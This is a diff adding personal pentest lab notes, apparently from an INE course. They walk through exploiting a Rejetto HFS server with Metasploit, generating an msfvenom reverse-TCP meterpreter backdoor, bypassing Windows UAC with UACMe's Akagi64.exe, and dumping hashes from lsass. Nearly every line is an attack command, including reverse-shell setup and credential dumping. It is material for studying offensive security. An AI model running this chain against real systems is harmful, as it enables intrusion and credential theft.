@@ -52,3 +52,47 @@ crackmapexec winrm demo.ine.local -u administrator -p tinkerbell -x "whomai"
 evil-winrm -i demo.ine.local -u administrator -p 'tinkerbell'
 you will get the shell
 
+UAC:
+User Account Control (UAC) is a Windows security feature that prevents unauthorized, system-wide changes by prompting for administrator permission before allowing apps or users to modify critical system settings.
+
+Scan the target
+we found the hfs http-file-server
+so we use the exploit hfs which is rejetto (the fileserver used by the webpage)
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS demo.ine.local
+exploit
+getuid
+sysinfo
+getsystem to see whether we have the high priviliges or not in this case we dont have the privileges
+take shell
+net localgroup administrators
+here admin,administrators are the members we dont have the enough permissions
+with help of UACMEtool we are going to bypass User Access Cintrol for Admin user 
+Generating malicious exe file using msfvenom in a new tab
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attackers_ip> LPORT=1234 -f exe > 'backdoor.exe'
+
+The UACMe tool located in "/root/Desktop/tools/UACME/" directory.
+
+now in the hfs meterpreter upload the upload /root/Desktop/tools/UACME/Akagi64.exe 
+upload /root/backdoor.exe 
+
+in the msfvenom tab msfconsole 
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <Attackers_ip>
+set LPORT 1234
+exploit
+this acts as a listener
+
+now switch to meterpreter 
+shell
+Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+go to listener
+We have successfully gained high privilege access. Dump the user hashes.
+ps -S lsass.exe
+migrate pid
+hashdump boom
+
+
+
